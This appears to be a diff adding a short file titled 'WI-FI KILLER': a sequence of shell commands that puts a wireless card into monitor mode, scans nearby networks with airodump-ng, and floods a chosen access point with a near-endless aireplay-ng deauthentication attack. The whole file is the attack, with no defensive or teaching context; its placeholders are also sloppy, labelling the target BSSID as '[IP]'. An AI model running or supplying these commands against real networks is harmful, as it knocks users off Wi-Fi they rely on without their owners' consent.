@@ -1,0 +1,9 @@
+WI-FI KILLER
+
+ifconfig wlan1 down
+iwconfig wlan1 mode monitor
+ifconfig wlan1 up
+
+airodump-ng wlan1
+airodump-ng --bssid [IP] --channel [] wlan1
+aireplay-ng --deauth 999999999 -a [IP] wlan1
